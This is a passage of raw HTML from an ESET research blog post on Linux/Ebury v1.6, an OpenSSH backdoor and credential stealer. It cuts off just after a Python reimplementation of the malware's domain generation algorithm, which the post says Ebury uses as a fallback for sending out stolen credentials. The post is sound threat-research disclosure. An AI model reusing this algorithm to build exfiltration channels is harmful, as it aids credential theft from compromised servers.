<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Frédéric Vachon',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Windigo Still not Windigone: An Ebury Update | WeLiveSecurity</title>
<meta name="description" content="In 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found a new Ebury sample."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Windigo Still not Windigone: An Ebury Update | WeLiveSecurity" />
<meta property="og:description" content="In 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found a new Ebury sample." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2017-10-30T10:58:35+00:00" />
<meta property="article:modified_time" content="2017-11-01T20:47:15+00:00" />
<meta property="og:updated_time" content="2017-11-01T20:47:15+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/Windigo-Still-not-Windigone-Ebury-Update-1-1024x681.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/Windigo-Still-not-Windigone-Ebury-Update-1-1024x681.jpg" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="681" />
<meta property="og:image:alt" content="Windigo Still not Windigone Ebury Update" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="In 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found a new Ebury sample." />
<meta name="twitter:title" content="Windigo Still not Windigone: An Ebury Update | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/Windigo-Still-not-Windigone-Ebury-Update-1.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2017/10/30/windigo-ainda-esta-vivo-uma-atualizacao-do-linuxebury/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/10/30/windigo-actualizacion-linux-ebury/" hreflang="es" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2017/10/30/windigo-ainda-esta-vivo-uma-atualizacao-do-linuxebury/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/10/30/windigo-actualizacion-linux-ebury/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2017/10/30/windigo-ainda-esta-vivo-uma-atualizacao-do-linuxebury/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/10/30/windigo-actualizacion-linux-ebury/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Windigo Still not Windigone: An Ebury Update</h1>
<div class="excerpt">In 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found a new Ebury sample.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/fvachon/" title="Frédéric Vachon">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2017/07/Frederic_Vachon-222x179.jpg" alt="Frédéric Vachon">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/fvachon/" title="Frédéric Vachon">
                    Frédéric Vachon                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-10-30 11:58:35">30 Oct 2017 - 11:58AM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F&text=Windigo Still not Windigone: An Ebury Update%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>In 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found a new Ebury sample.</p>
                            </div>

                            <p>Back in February 2014, ESET researchers wrote a <a href="https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/" target="_blank" rel="noopener">blog post</a> about an OpenSSH backdoor and credential stealer called Linux/Ebury. Further research showed that this component was the core of an operation involving multiple malware families we called &#8220;Operation Windigo&#8221;. This led to the publication of a <a href="https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf" target="_blank" rel="noopener">whitepaper</a> covering the full operation.</p>
<p>In February 2017, we found a new Ebury sample, that introduces a significant number of new features. The version number was bumped to 1.6.2a. At the time of that discovery, the latest versions we had seen were 1.5.x, months before. After further investigation, we realized that its infrastructure for exfiltrating credentials was still operational and that Ebury was still being actively used by the Windigo gang.</p>
<p>The original IoCs that we provided back in 2014 are for version 1.4 of Ebury. On their <a href="https://www.cert-bund.de/ebury-faq" target="_blank" rel="noopener">website</a>, CERT-Bund updated the IoCs for version 1.5. In this blog post, we provide technical details about version 1.6, which we discovered in February 2017. We also share updated IoCs for versions 1.5 and 1.6.</p>
<h2><strong>New DGA for exfiltration fallback</strong></h2>
<p>Ebury v1.4 has a fallback mechanism whereby a domain generation algorithm (DGA) is used when the attacker doesn’t connect to the infected system via the OpenSSH backdoor for three days. Under these conditions, Ebury will exfiltrate the collected data using the generated domain. Ebury v1.6 has the same mechanism, but there is a minor change to the DGA itself. Only the constants changed between these two versions, as shown in Figure 2.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803023848783086" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def DGA(domain_no):
    # ords returns the signed integer representation of a one-char string
    # (the built-in ord returns only unsigned values)
    ords = lambda c: struct.unpack("b", c)[0]
    TLDS = [ 'info', 'net', 'biz' ]
    KEY = "fmqzdnvcyelwaibsrxtpkhjguo"
    h = "%x" % ((domain_no * domain_no + 3807225) &amp; 0xFFFFFFFF)
    g = ""
    for i in range(len(h))[::-1]:
        g += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)]
        g += h[i]
    g += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)]
    g += '.%s' % TLDS[domain_no % len(TLDS)]
    return g</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803023848783086-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-2">2</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-4">4</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-6">6</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-8">8</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-10">10</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-12">12</div><div class="crayon-num" data-line="crayon-60581b9803023848783086-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803023848783086-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803023848783086-1"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">DGA</span><span class="crayon-sy">(</span><span class="crayon-v">domain_no</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># ords returns the signed integer representation of a one-char string</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c"># (the built-in ord returns only unsigned values)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">ords</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">lambda</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-k ">struct</span><span class="crayon-sy">.</span><span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">"b"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">TLDS</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'info'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'net'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'biz'</span><span class="crayon-h"> </span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">KEY</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fmqzdnvcyelwaibsrxtpkhjguo"</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">h</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"%x"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">domain_no</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-v">domain_no</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">3807225</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFF</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-k ">range</span><span class="crayon-sy">(</span><span class="crayon-k ">len</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-o">::</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">KEY</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">ords</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-cn">3579</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ords</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-sy">[</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">domain_no</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-k ">len</span><span class="crayon-sy">(</span><span class="crayon-v">KEY</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">h</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">KEY</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">ords</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-sy">[</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-cn">5612</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-k ">len</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">domain_no</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-k ">len</span><span class="crayon-sy">(</span><span class="crayon-v">KEY</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60581b9803023848783086-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'.%s'</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-v">TLDS</span><span class="crayon-sy">[</span><span class="crayon-v">domain_no</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-k ">len</span><span class="crayon-sy">(</span><span class="crayon-v">TLDS</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803023848783086-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">g</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p><strong>Figure 1</strong>. Ebury v1.6 new DGA implemented in Python</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803029998378316" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
